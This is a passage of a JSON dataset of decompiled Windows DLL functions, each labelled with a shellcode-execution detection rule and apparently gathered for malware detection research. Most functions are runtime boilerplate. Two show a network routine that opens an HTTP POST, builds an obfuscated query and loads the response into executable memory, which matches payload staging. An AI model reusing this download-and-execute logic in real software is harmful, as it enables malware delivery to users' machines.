        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.1800641b0(ulong arg1, ushort *arg2, int64_t arg3)\n\n{\n    uchar auStack104 [32];\n    ulong uStack72;\n    ushort *puStack64;\n    ulong *puStack56;\n    uchar auStack48 [16];\n    ulong uStack32;\n    uint64_t uStack24;\n    \n    uStack72 = 0xfffffffffffffffe;\n    uStack24 = *0x180123080 ^ auStack104;\n    auStack48 = CONCAT88(arg2, arg2);\n    uStack32 = arg1;\n    if (arg3 != 0) {\n        do {\n            puStack64 = arg2;\n            fcn.1800ae290(arg2, 0, 0xe8);\n            *(arg2 + 8) = 0;\n            *(arg2 + 0xc) = 7;\n            *arg2 = 0;\n            *(arg2 + 0x18) = 0;\n            *(arg2 + 0x1c) = 0xf;\n            *(arg2 + 0x10) = 0;\n            puStack56 = arg2 + 0x20;\n            *puStack56 = 0;\n            fcn.18002ddc0(arg2 + 0x24);\n            *(arg2 + 0x3c) = 0;\n            *(arg2 + 0x40) = 7;\n            arg2[0x34] = 0;\n            *(arg2 + 0x44) = 0;\n            *(arg2 + 0x48) = 0;\n            *(arg2 + 0x4c) = 0;\n            *(arg2 + 0x50) = 0;\n            *(arg2 + 0x54) = 0;\n            *(arg2 + 0x58) = 0;\n            *(arg2 + 0x5c) = 0;\n            *(arg2 + 0x60) = 0;\n            *(arg2 + 100) = 0;\n            *(arg2 + 0x68) = 0;\n            *(arg2 + 0x6c) = 0;\n            *(arg2 + 0x70) = 0;\n            arg2 = arg2 + 0x74;\n            auStack48 = CONCAT88(arg2, auStack48._0_8_);\n            arg3 = arg3 + -1;\n        } while (arg3 != 0);\n    }\n    fcn.18008fb00(uStack24 ^ auStack104);\n    return;\n}\n",
        "token_count": 574
    },
    "1800642f": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nuchar (*) [16] fcn.1800642f0(ulong noname_0, uchar (*arg2) [16], int64_t arg3)\n\n{\n    ulong *puVar1;\n    \n    if (arg3 != 0) {\n        puVar1 = arg2[3] + 8;\n        do {\n            *arg2 = ZEXT816(0);\n            arg2[1] = ZEXT816(0);\n            arg2[2] = ZEXT816(0);\n            arg2[3] = ZEXT816(0);\n            (*arg2)[0] = 0;\n            arg2 = arg2[4];\n            puVar1[-5] = 0;\n            puVar1[-4] = 0xf;\n            puVar1[-1] = 0;\n            *puVar1 = 7;\n            *(puVar1 + -3) = 0;\n            arg3 = arg3 + -1;\n            puVar1 = puVar1 + 8;\n        } while (arg3 != 0);\n    }\n    fcn.180064010(arg2, arg2);\n    return arg2;\n}\n",
        "token_count": 250
    },
    "180064c7": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid fcn.180064c70(int64_t *arg1)\n\n{\n    code *pcVar1;\n    ulong *puVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    uint64_t uVar5;\n    int64_t iVar6;\n    \n    iVar3 = arg1[0x1a];\n    if (iVar3 != 0) {\n        uVar5 = arg1[0x1c] - iVar3 & 0xfffffffffffffffc;\n        iVar4 = iVar3;\n        if (0xfff < uVar5) {\n            iVar4 = *(iVar3 + -8);\n            iVar6 = uVar5 + 0x27;\n            iVar3 = iVar3 - iVar4;\n            if (0x1f < iVar3 - 8U) goto code_r0x000180064f1d;\n        }\n        fcn.18008fb24(iVar4);\n        arg1[0x1a] = 0;\n        arg1[0x1b] = 0;\n        arg1[0x1c] = 0;\n    }\n    if (arg1[0x17] != 0) {\n        fcn.180013aa0(arg1[0x17], arg1[0x18]);\n        iVar3 = arg1[0x17];\n        uVar5 = arg1[0x19] - iVar3 & 0xffffffffffffffe0;\n        iVar4 = iVar3;\n        if (0xfff < uVar5) {\n            iVar4 = *(iVar3 + -8);\n            iVar6 = uVar5 + 0x27;\n            iVar3 = iVar3 - iVar4;\n            if (0x1f < iVar3 - 8U) goto code_r0x000180064f1d;\n        }\n        fcn.18008fb24(iVar4);\n        arg1[0x17] = 0;\n        arg1[0x18] = 0;\n        arg1[0x19] = 0;\n    }\n    iVar3 = arg1[0x14];\n    if (iVar3 != 0) {\n        uVar5 = arg1[0x16] - iVar3 & 0xfffffffffffffffc;\n        iVar4 = iVar3;\n        if (0xfff < uVar5) {\n            iVar4 = *(iVar3 + -8);\n            iVar6 = uVar5 + 0x27;\n            iVar3 = iVar3 - iVar4;\n            if (0x1f < iVar3 - 8U) goto code_r0x000180064f1d;\n        }\n        fcn.18008fb24(iVar4);\n        arg1[0x14] = 0;\n        arg1[0x15] = 0;\n        arg1[0x16] = 0;\n    }\n    iVar3 = arg1[0x11];\n    if (iVar3 != 0) {\n        uVar5 = arg1[0x13] - iVar3 & 0xfffffffffffffffc;\n        iVar4 = iVar3;\n        if (0xfff < uVar5) {\n            iVar4 = *(iVar3 + -8);\n            iVar6 = uVar5 + 0x27;\n            iVar3 = iVar3 - iVar4;\n            if (0x1f < iVar3 - 8U) goto code_r0x000180064f1d;\n        }\n        fcn.18008fb24(iVar4);\n        arg1[0x11] = 0;\n        arg1[0x12] = 0;\n        arg1[0x13] = 0;\n    }\n    if (7 < arg1[0x10]) {\n        iVar3 = arg1[0xd];\n        iVar6 = arg1[0x10] * 2;\n        iVar4 = iVar3;\n        if (0xfff < iVar6 + 2U) {\n            iVar4 = *(iVar3 + -8);\n            iVar6 = iVar6 + 0x29;\n            iVar3 = iVar3 - iVar4;\n            if (0x1f < iVar3 - 8U) goto code_r0x000180064f1d;\n        }\n        fcn.18008fb24(iVar4);\n    }\n    arg1[0xf] = 0;\n    arg1[0x10] = 7;\n    *(arg1 + 0xd) = 0;\n    fcn.18002e090(arg1 + 8);\n    if ((arg1[0xc] != NULL) && (puVar2 = (**(*arg1[0xc] + 0x10))(),  puVar2 != NULL)) {\n        (***puVar2)(puVar2, 1);\n    }\n    uVar5 = arg1[7];\n    if (0xf < uVar5) {\n        iVar3 = arg1[4];\n        iVar4 = iVar3;\n        if (0xfff < uVar5 + 1) {\n            iVar4 = *(iVar3 + -8);\n            iVar6 = uVar5 + 0x28;\n            iVar3 = iVar3 - iVar4;\n            if (0x1f < iVar3 - 8U) goto code_r0x000180064f1d;\n        }\n        fcn.18008fb24(iVar4);\n    }\n    arg1[6] = 0;\n    arg1[7] = 0xf;\n    *(arg1 + 4) = 0;\n    if (7 < arg1[3]) {\n        iVar3 = *arg1;\n        iVar6 = arg1[3] * 2;\n        iVar4 = iVar3;\n        if (0xfff < iVar6 + 2U) {\n            iVar4 = *(iVar3 + -8);\n            iVar6 = iVar6 + 0x29;\n            iVar3 = iVar3 - iVar4;\n            if (0x1f < iVar3 - 8U) {\ncode_r0x000180064f1d:\n                fcn.1800b3528(iVar3, iVar6);\n                pcVar1 = swi(3);\n                (*pcVar1)();\n                return;\n            }\n        }\n        fcn.18008fb24(iVar4);\n    }\n    arg1[2] = 0;\n    *arg1 = 0;\n    arg1[3] = 7;\n    return;\n}\n",
        "token_count": 1391
    },
    "180066d2": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid fcn.180066d20(int64_t arg1)\n\n{\n    uchar auStack104 [32];\n    int32_t iStack72;\n    int32_t iStack64;\n    uint uStack56;\n    int32_t iStack40;\n    int32_t iStack36;\n    int32_t iStack32;\n    int32_t iStack28;\n    int32_t iStack24;\n    int32_t iStack20;\n    uint64_t uStack16;\n    \n    uStack16 = *0x180123080 ^ auStack104;\n    (**0x1800de5d0)(*(arg1 + 0x10));\n    iStack40 = (iStack24 - iStack32) / 2 + iStack32;\n    iStack36 = (iStack20 - iStack28) / 2 + iStack28;\n    (**0x1800de688)(*(arg1 + 0x10), &iStack40);\n    iStack64 = *(arg1 + 0x2c) - *(arg1 + 0x24);\n    iStack72 = *(arg1 + 0x28) - *(arg1 + 0x20);\n    uStack56 = 0x40;\n    (**0x1800de7c8)(*(arg1 + 0x18), 0, iStack40 - iStack72 / 2, iStack36 - iStack64 / 2);\n    fcn.18008fb00(uStack16 ^ auStack104);\n    return;\n}\n",
        "token_count": 330
    },
    "18006726": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nint64_t fcn.180067260(uint8_t *arg1, int32_t *arg2)\n\n{\n    uint8_t uVar1;\n    char cVar2;\n    int32_t iVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    int64_t iVar6;\n    int32_t iVar7;\n    \n    iVar3 = 0;\n    iVar4 = (**0x1800de418)();\n    iVar7 = 0;\n    if (0 < *arg2) {\n        iVar6 = 0;\n        do {\n            uVar1 = *arg1;\n            if (((uVar1 + 0x9f < 0x1a) || (uVar1 + 0xbf < 0x1a)) || (uVar1 - 0x30 < 10)) {\n                *(iVar6 + iVar4) = uVar1;\n                iVar5 = 1;\n            }\n            else {\n                *(iVar6 + iVar4) = 0x25;\n                cVar2 = '7';\n                if (uVar1 >> 4 < 10) {\n                    cVar2 = '0';\n                }\n                *(iVar6 + 1 + iVar4) = cVar2 + (uVar1 >> 4);\n                cVar2 = '7';\n                if ((uVar1 & 0xf) < 10) {\n                    cVar2 = '0';\n                }\n                *(iVar6 + 2 + iVar4) = cVar2 + (uVar1 & 0xf);\n                iVar5 = 3;\n            }\n            iVar7 = iVar7 + 1;\n            iVar3 = iVar5 + iVar3;\n            iVar6 = iVar6 + iVar5;\n            arg1 = arg1 + 1;\n        } while (iVar7 < *arg2);\n        *arg2 = iVar3;\n        return iVar4;\n    }\n    *arg2 = 0;\n    return iVar4;\n}\n",
        "token_count": 423
    },
    "180067b9": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid fcn.180067b90(ulong *arg1)\n\n{\n    int64_t *piVar1;\n    ulong *puVar2;\n    uchar auStack120 [48];\n    ulong uStack72;\n    uchar auStack64 [16];\n    uchar auStack48 [16];\n    int64_t *piStack32;\n    uint64_t uStack24;\n    \n    uStack72 = 0xfffffffffffffffe;\n    uStack24 = *0x180123080 ^ auStack120;\n    auStack48 = ZEXT816(0);\n    piStack32 = NULL;\n    auStack64 = ZEXT816(0);\n    fcn.18002ddc0(auStack64 + 8);\n    puVar2 = arg1;\n    if (0xf < arg1[3]) {\n        puVar2 = *arg1;\n    }\n    piVar1 = arg1 + 2;\n    if (0xf < arg1[3]) {\n        arg1 = *arg1;\n    }\n    fcn.18002f0b0(auStack64, arg1, *piVar1 + puVar2);\n    fcn.18002e090(auStack64);\n    if (piStack32 != NULL) {\n        puVar2 = (**(*piStack32 + 0x10))();\n        if (puVar2 != NULL) {\n            (***puVar2)(puVar2, 1);\n        }\n    }\n    fcn.18008fb00(uStack24 ^ auStack120);\n    return;\n}\n",
        "token_count": 332
    },
    "18006a48": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_20h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.18006a480(ulong arg1)\n\n{\n    int32_t iVar1;\n    int64_t iVar2;\n    uint64_t uVar3;\n    char *arg4;\n    ulong var_bp_20h;\n    ulong var_30h;\n    ulong var_70h;\n    ulong var_f0h;\n    ulong var_920h;\n    uchar auStack2616 [32];\n    ulong uStack2584;\n    ulong uStack2576;\n    uint uStack2568;\n    ulong uStack2560;\n    uint auStack2552 [2];\n    ulong uStack2544;\n    ulong uStack2536;\n    uchar *puStack2528;\n    uint uStack2520;\n    ushort uStack2516;\n    ulong uStack2512;\n    uint uStack2504;\n    uchar *puStack2496;\n    uint uStack2488;\n    int64_t iStack2480;\n    uint uStack2472;\n    uchar auStack2464 [16];\n    uint uStack2440;\n    uint auStack2436 [3];\n    uchar auStack2424 [16];\n    uchar auStack2408 [16];\n    uchar auStack2392 [16];\n    uchar auStack2376 [16];\n    uchar auStack2360 [16];\n    uchar auStack2344 [16];\n    uint uStack2328;\n    uchar auStack2312 [63];\n    uchar uStack2249;\n    uchar auStack2248 [128];\n    char acStack2120 [1984];\n    ulong var_80h;\n    ulong var_bp_78h;\n    ulong var_70h_2;\n    ulong var_bp_68h;\n    ulong var_50h;\n    ulong var_bp_40h;\n    ulong var_30h_2;\n    uint64_t var_bp_10h;\n    uint64_t uVar4;\n    \n    var_bp_10h = *0x180123080 ^ auStack2616;\n    uStack2440 = 0x824;\n    fcn.1800ae290(acStack2120, 0, 0x824);\n    auStack2552[0] = 0x68;\n    puStack2528 = auStack2312;\n    puStack2496 = auStack2248;\n    uStack2544 = 0;\n    uStack2536 = 1;\n    uStack2520 = 0x40;\n    uStack2516 = 0;\n    uStack2512 = 0;\n    uStack2504 = 1;\n    uStack2488 = 0x80;\n    iStack2480 = 0;\n    uStack2472 = 1;\n    auStack2464 = ZEXT816(0);\n    if (*0x18012b038 == NULL) {\n        iVar2 = (**0x1800de138)(0x1800fece8);\n        if (((iVar2 == 0) && (*0x18012a350 < 0x20)) && (iVar2 = (**0x1800de140)(),  iVar2 != 0)) {\n            *(*0x18012a350 * 8 + 0x18012a240) = iVar2;\n            *0x18012a350 = *0x18012a350 + 1;\n        }\n        *0x18012b038 = (**0x1800de458)(iVar2, \"InternetCrackUrlA\");\n        if (*0x18012b038 == NULL) goto code_r0x00018006a98e;\n    }\n    if (*0x18012b0a0 == NULL) {\n        iVar2 = (**0x1800de138)(0x1800fed08);\n        if (((iVar2 == 0) && (*0x18012a350 < 0x20)) && (iVar2 = (**0x1800de140)(),  iVar2 != 0)) {\n            *(*0x18012a350 * 8 + 0x18012a240) = iVar2;\n            *0x18012a350 = *0x18012a350 + 1;\n        }\n        *0x18012b0a0 = (**0x1800de458)(iVar2, \"InternetConnectA\");\n        if (*0x18012b0a0 == NULL) goto code_r0x00018006a98e;\n    }\n    if (*0x18012b050 == NULL) {\n        iVar2 = (**0x1800de138)(0x1800fed28);\n        if (((iVar2 == 0) && (*0x18012a350 < 0x20)) && (iVar2 = (**0x1800de140)(),  iVar2 != 0)) {\n            *(*0x18012a350 * 8 + 0x18012a240) = iVar2;\n            *0x18012a350 = *0x18012a350 + 1;\n        }\n        *0x18012b050 = (**0x1800de458)(iVar2, \"InternetSetOptionA\");\n        if (*0x18012b050 == NULL) goto code_r0x00018006a98e;\n    }\n    if (*0x18012b088 == NULL) {\n        iVar2 = (**0x1800de138)(0x1800fed48);\n        if (((iVar2 == 0) && (*0x18012a350 < 0x20)) && (iVar2 = (**0x1800de140)(),  iVar2 != 0)) {\n            *(*0x18012a350 * 8 + 0x18012a240) = iVar2;\n            *0x18012a350 = *0x18012a350 + 1;\n        }\n        *0x18012b088 = (**0x1800de458)(iVar2, \"DeleteUrlCacheEntryA\");\n        if (*0x18012b088 == NULL) goto code_r0x00018006a98e;\n    }\n    if (*0x18012b040 == NULL) {\n        iVar2 = (**0x1800de138)(0x1800fed70);\n        if (((iVar2 == 0) && (*0x18012a350 < 0x20)) && (iVar2 = (**0x1800de140)(),  iVar2 != 0)) {\n            *(*0x18012a350 * 8 + 0x18012a240) = iVar2;\n            *0x18012a350 = *0x18012a350 + 1;\n        }\n        *0x18012b040 = (**0x1800de458)(iVar2, \"HttpOpenRequestA\");\n        if (*0x18012b040 == NULL) goto code_r0x00018006a98e;\n    }\n    if (*0x18012b058 == NULL) {\n        iVar2 = (**0x1800de138)(0x1800fed90);\n        if (((iVar2 == 0) && (*0x18012a350 < 0x20)) && (iVar2 = (**0x1800de140)(),  iVar2 != 0)) {\n            *(*0x18012a350 * 8 + 0x18012a240) = iVar2;\n            *0x18012a350 = *0x18012a350 + 1;\n        }\n        *0x18012b058 = (**0x1800de458)(iVar2, \"InternetCanonicalizeUrlA\");\n        if (*0x18012b058 == NULL) goto code_r0x00018006a98e;\n    }\n    (**0x18012b088)(arg1);\n    (**0x18012b058)(arg1, acStack2120, &uStack2440, 0x3e000000);\n    uVar4 = 0xffffffffffffffff;\n    do {\n        uVar3 = uVar4 + 1;\n        iVar2 = uVar4 + 1;\n        uVar4 = uVar3;\n    } while (acStack2120[iVar2] != '\\0');\n    iVar1 = (**0x18012b038)(acStack2120, uVar3 & 0xffffffff, 0, auStack2552);\n    if (((iVar1 == 0) || (puStack2528 == NULL)) || (iStack2480 == 0)) {\n        uStack2584 = fcn.1800696f0();\n        arg4 = \"Unable to decode UR\";\n    }\n    else {\n        uStack2249 = 0;\n        *0x18012a340 = fcn.18006a0b0();\n        if (*0x18012a340 == 0) {\n            uStack2584 = fcn.1800696f0();\n            arg4 = \"Could not open Internet session\";\n        }\n        else {\n            uStack2560 = 0;\n            uStack2568 = 0;\n            uStack2576 = CONCAT44(uStack2576._4_4_, 3);\n            uStack2584 = 0;\n            *0x18012a380 = (**0x18012b0a0)(*0x18012a340, puStack2528, uStack2516, 0);\n            if (*0x18012a380 == 0) {\n                uStack2584 = fcn.1800696f0();\n                arg4 = \"Could not connect to server\";\n            }\n            else {\n                uStack2568 = 0x4480200;\n                if (uStack2536._4_4_ == 4) {\n                    uStack2568 = 0x4c80200;\n                }\n                uStack2560 = 0;\n                uStack2576 = 0;\n                uStack2584 = 0;\n                *0x18012a348 = (**0x18012b040)(*0x18012a380, \"POST\", iStack2480, 0);\n                if (*0x18012a348 != 0) {\n                    auStack2436[0] = 0xf180;\n                    (**0x18012b050)(*0x18012a348, 0x1f, auStack2436);\n                    goto code_r0x00018006a98e;\n                }\n                uStack2584 = fcn.1800696f0();\n                arg4 = \"Could not open UR\";\n            }\n        }\n    }\n    uStack2328 = 0;\n    auStack2424 = ZEXT816(0);\n    auStack2408 = ZEXT816(0);\n    auStack2392 = ZEXT816(0);\n    auStack2376 = ZEXT816(0);\n    auStack2360 = ZEXT816(0);\n    auStack2344 = ZEXT816(0);\n    fcn.180069580(auStack2424, 100, \"%s: %s\", arg4);\ncode_r0x00018006a98e:\n    fcn.18008fb00(var_bp_10h ^ auStack2616);\n    return;\n}\n",
        "token_count": 2420
    },
    "18006b4d": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid fcn.18006b4d0(ulong *arg1, uint *arg2)\n\n{\n    int32_t iVar1;\n    ulong uVar2;\n    uint64_t arg1_00;\n    int64_t arg2_00;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    char *pcVar5;\n    uchar auStack2248 [32];\n    char *pcStack2216;\n    int64_t iStack2208;\n    int64_t iStack2200;\n    uint auStack2184 [2];\n    uchar auStack2176 [16];\n    uchar auStack2152 [2096];\n    uint64_t uStack56;\n    \n    uStack56 = *0x180123080 ^ auStack2248;\n    fcn.1800ae290(auStack2152, 0, 0x824);\n    uVar4 = 0;\n    auStack2184[0] = 0;\n    auStack2176 = ZEXT816(0);\n    uVar2 = fcn.1800b2838(0);\n    fcn.1800b62e0(uVar2);\n    iVar1 = fcn.1800b62b4(uVar2);\n    iStack2200 = (iVar1 % 10) * 0xc + 0x1800fdb10;\n    iVar1 = fcn.1800b62b4((iVar1 % 10) * 3);\n    iStack2208 = (iVar1 % 10) * 0xc + 0x1800fdc20;\n    iVar1 = fcn.1800b62b4(iVar1 % 10);\n    pcStack2216 = \"NKRRB\";\n    fcn.180069580(auStack2152, 0x824, \"%s=%s&%s=4J51298Y9WEHPGP293HGE&%s=\", \"idxAp\" + (iVar1 % 10) * 0xc);\n    arg1_00 = fcn.1800b2838(0);\n    fcn.1800b62e0(arg1_00);\n    pcVar5 = auStack2176;\n    do {\n        iVar1 = fcn.1800b62b4(arg1_00);\n        uVar4 = uVar4 + 1;\n        uVar3 = (iVar1 / 0x19) * 0x19;\n        arg1_00 = uVar3;\n        *pcVar5 = (iVar1 - uVar3) + 'a';\n        pcVar5 = pcVar5 + 1;\n    } while (uVar4 < 0xf);\n    iVar1 = fcn.18006a9c0(arg1_00, auStack2152, auStack2176, 0x10);\n    if (iVar1 != 0) {\n        uVar2 = 0x40;\n        arg2_00 = (**0x1800de418)(0x40, 0x100000);\n        if (arg2_00 != 0) {\n            iVar1 = fcn.18006ad90(uVar2, arg2_00, 0x100000, auStack2184);\n            if (iVar1 == 0) {\n                (**0x1800de0f8)();\n            }\n            else {\n                uVar2 = fcn.1800651b0(arg2_00, auStack2184);\n                *arg1 = uVar2;\n                *arg2 = auStack2184[0];\n            }\n        }\n    }\n    fcn.18008fb00(uStack56 ^ auStack2248);\n    return;\n}\n",
        "token_count": 797
    },
    "18008bee": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_20h\n\nvoid fcn.18008bee8(ulong arg1, ulong arg2, ulong arg3, int64_t arg4)\n\n{\n    uint uVar1;\n    uint uVar2;\n    uint8_t uVar3;\n    uint uVar4;\n    code **ppcVar5;\n    uint *puVar6;\n    code **ppcVar7;\n    code *pcVar8;\n    ulong uVar9;\n    code **arg2_00;\n    int64_t iVar10;\n    uchar auStackX16 [8];\n    ulong var_38h;\n    code **appcStack56 [2];\n    ulong var_20h;\n    ulong var_18h;\n    ulong var_10h;\n    \n    uVar3 = fcn.18002f930(0, 0);\n    arg2_00 = NULL;\n    if ((arg2 & (1 << (uVar3 & 0x1f)) >> 1) != 0) {\n        if (arg4 == 0) {\n            if (*0x18012b0e0 == 0) {\n                fcn.18006da30(auStackX16, 0);\n                if (*0x18012b0e0 == 0) {\n                    *0x1801286b8 = *0x1801286b8 + 1;\n                    *0x18012b0e0 = *0x1801286b8;\n                }\n                fcn.18006dab0(auStackX16);\n            }\n            iVar10 = *0x18012b0e0;\n            ppcVar5 = fcn.18008fb2c(0x20);\n            ppcVar7 = arg2_00;\n            if (ppcVar5 != NULL) {\n                *(ppcVar5 + 1) = 0;\n                *ppcVar5 = vtable.std::collate_char_.0;\n                puVar6 = fcn.18007436c(appcStack56);\n                uVar4 = puVar6[1];\n                uVar1 = puVar6[2];\n                uVar2 = puVar6[3];\n                *(ppcVar5 + 2) = *puVar6;\n                *(ppcVar5 + 0x14) = uVar4;\n                *(ppcVar5 + 3) = uVar1;\n                *(ppcVar5 + 0x1c) = uVar2;\n                ppcVar7 = ppcVar5;\n            }\n            fcn.180071848(arg3, ppcVar7, iVar10);\n        }\n        else {\n            if (*0x18012b0e0 == 0) {\n                fcn.18006da30(auStackX16, 0);\n                if (*0x18012b0e0 == 0) {\n                    *0x1801286b8 = *0x1801286b8 + 1;\n                    *0x18012b0e0 = *0x1801286b8;\n                }\n                fcn.18006dab0(auStackX16);\n            }\n            iVar10 = *0x18012b0e0;\n            uVar9 = fcn.18002f490(arg4);\n            fcn.180071848(arg3, uVar9, iVar10);\n        }\n    }\n    if ((arg2 & 0x20) != 0) {\n        if (arg4 == 0) {\n            if (*0x180128a30 == 0) {\n                fcn.18006da30(auStackX16, 0);\n                if (*0x180128a30 == 0) {\n                    *0x1801286b8 = *0x1801286b8 + 1;\n                    *0x180128a30 = *0x1801286b8;\n                }\n                fcn.18006dab0(auStackX16);\n            }\n            iVar10 = *0x180128a30;\n            ppcVar5 = fcn.18008fb2c(0x10);\n            ppcVar7 = arg2_00;\n            if (ppcVar5 != NULL) {\n                *(ppcVar5 + 1) = 0;\n                *ppcVar5 = vtable.std::messages_char_.0;\n                ppcVar7 = ppcVar5;\n            }\n        }\n        else {\n            if (*0x180128a30 == 0) {\n                fcn.18006da30(auStackX16, 0);\n                if (*0x180128a30 == 0) {\n                    *0x1801286b8 = *0x1801286b8 + 1;\n                    *0x180128a30 = *0x1801286b8;\n                }\n                fcn.18006dab0(auStackX16);\n            }\n            iVar10 = *0x180128a30;\n            ppcVar7 = fcn.180089674(arg4);\n        }\n        fcn.180071848(arg3, ppcVar7, iVar10);\n    }\n    if ((arg2 & 4) != 0) {\n        if (arg4 == 0) {\n            if (*0x180128a38 == 0) {\n                fcn.18006da30(auStackX16, 0);\n                if (*0x180128a38 == 0) {\n                    *0x1801286b8 = *0x1801286b8 + 1;\n                    *0x180128a38 = *0x1801286b8;\n                }\n                fcn.18006dab0(auStackX16);\n            }\n            iVar10 = *0x180128a38;\n            ppcVar5 = fcn.18008fb2c(0x10);\n            ppcVar7 = arg2_00;\n            if (ppcVar5 != NULL) {\n                *(ppcVar5 + 1) = 0;\n                *ppcVar5 = \n                vtable.std::money_get_char__class_std::istreambuf_iterator_char__struct_std::char_traits_char___.0;\n                ppcVar7 = ppcVar5;\n            }\n            fcn.180071848(arg3, ppcVar7, iVar10);\n            if (*0x180128a40 == 0) {\n                fcn.18006da30(auStackX16, 0);\n                if (*0x180128a40 == 0) {\n                    *0x1801286b8 = *0x1801286b8 + 1;\n                    *0x180128a40 = *0x1801286b8;\n                }\n                fcn.18006dab0(auStackX16);\n            }\n            iVar10 = *0x180128a40;\n            ppcVar5 = fcn.18008fb2c(0x10);\n            ppcVar7 = arg2_00;\n            if (ppcVar5 != NULL) {\n                *(ppcVar5 + 1) = 0;\n                *ppcVar5 = \n                vtable.std::money_put_char__class_std::ostreambuf_iterator_char__struct_std::char_traits_char___.0;\n                ppcVar7 = ppcVar5;\n            }\n            fcn.180071848(arg3, ppcVar7, iVar10);\n            if (*0x180128a48 == 0) {\n                fcn.18006da30(auStackX16, 0);\n                if (*0x180128a48 == 0) {\n                    *0x1801286b8 = *0x1801286b8 + 1;\n                    *0x180128a48 = *0x1801286b8;\n                }\n                fcn.18006dab0(auStackX16);\n            }\n            iVar10 = *0x180128a48;\n            ppcVar5 = fcn.18008fb2c(0x78);\n            ppcVar7 = arg2_00;\n            if (ppcVar5 != NULL) {\n                *(ppcVar5 + 1) = 0;\n                *ppcVar5 = vtable.std::_Mpunct_char_.0;\n                *(ppcVar5 + 0x44) = 0;\n                fcn.18008bd50(ppcVar5);\n                *ppcVar5 = vtable.std::moneypunct_char__0_.0;\n                ppcVar7 = ppcVar5;\n            }\n            fcn.180071848(arg3, ppcVar7, iVar10);\n            if (*0x180128a50 == 0) {\n                fcn.18006da30(auStackX16, 0);\n                if (*0x180128a50 == 0) {\n                    *0x1801286b8 = *0x1801286b8 + 1;\n                    *0x180128a50 = *0x1801286b8;\n                }\n                fcn.18006dab0(auStackX16);\n            }\n            iVar10 = *0x180128a50;\n            ppcVar5 = fcn.18008fb2c(0x78);\n            ppcVar7 = arg2_00;\n            if (ppcVar5 != NULL) {\n                *(ppcVar5 + 1) = 0;\n                *ppcVar5 = vtable.std::_Mpunct_char_.0;\n                *(ppcVar5 + 0x44) = 1;\n                fcn.18008bd50(ppcVar5);\n                *ppcVar5 = vtable.std::moneypunct_char__1_.0;\n                ppcVar7 = ppcVar5;\n            }\n        }\n        else {\n            if (*0x180128a38 == 0) {\n                fcn.18006da30(auStackX16, 0);\n                if (*0x180128a38 == 0) {\n                    *0x1801286b8 = *0x1801286b8 + 1;\n                    *0x180128a38 = *0x1801286b8;\n                }\n                fcn.18006dab0(auStackX16);\n            }\n            iVar10 = *0x180128a38;\n            uVar9 = fcn.1800897a8(arg4);\n            fcn.180071848(arg3, uVar9, iVar10);\n            if (*0x180128a40 == 0) {\n                fcn.18006da30(auStackX16, 0);\n                if (*0x180128a40 == 0) {\n                    *0x1801286b8 = *0x1801286b8 + 1;\n                    *0x180128a40 = *0x1801286b8;\n                }\n                fcn.18006dab0(auStackX16);\n            }\n            iVar10 = *0x180128a40;\n            uVar9 = fcn.1800898dc(arg4);\n            fcn.180071848(arg3, uVar9, iVar10);\n            if (*0x180128a48 == 0) {\n                fcn.18006da30(auStackX16, 0);\n                if (*0x180128a48 == 0) {\n                    *0x1801286b8 = *0x1801286b8 + 1;\n                    *0x180128a48 = *0x1801286b8;\n                }\n                fcn.18006dab0(auStackX16);\n            }\n            iVar10 = *0x180128a48;\n            uVar9 = fcn.180089b44(arg4);\n            fcn.180071848(arg3, uVar9, iVar10);\n            if (*0x180128a50 == 0) {\n                fcn.18006da30(auStackX16, 0);\n                if (*0x180128a50 == 0) {\n                    *0x1801286b8 = *0x1801286b8 + 1;\n                    *0x180128a50 = *0x1801286b8;\n                }\n                fcn.18006dab0(auStackX16);\n            }\n            iVar10 = *0x180128a50;\n            ppcVar7 = fcn.180089a10(arg4);\n        }\n        fcn.180071848(arg3, ppcVar7, iVar10);\n    }\n    if ((arg2 & 0x10) != 0) {\n        if (arg4 == 0) {\n            if (*0x180128a58 == 0) {\n                fcn.18006da30(auStackX16, 0);\n                if (*0x180128a58 == 0) {\n                    *0x1801286b8 = *0x1801286b8 + 1;\n                    *0x180128a58 = *0x1801286b8;\n                }\n                fcn.18006dab0(auStackX16);\n            }\n            iVar10 = *0x180128a58;\n            ppcVar5 = fcn.18008fb2c(0x58);\n            ppcVar7 = arg2_00;\n            if (ppcVar5 != NULL) {\n                *(ppcVar5 + 1) = 0;\n                *ppcVar5 = \n                vtable.std::time_get_char__class_std::istreambuf_iterator_char__struct_std::char_traits_char___.0;\n                ppcVar5[2] = NULL;\n                ppcVar5[3] = NULL;\n                ppcVar5[4] = NULL;\n                ppcVar7 = ppcVar5;\n                appcStack56[0] = ppcVar5;\n                fcn.1800894f0(ppcVar5, 0, arg1);\n                uVar4 = fcn.18008fa9c(ppcVar7);\n                *(ppcVar5 + 5) = uVar4;\n                ppcVar7 = 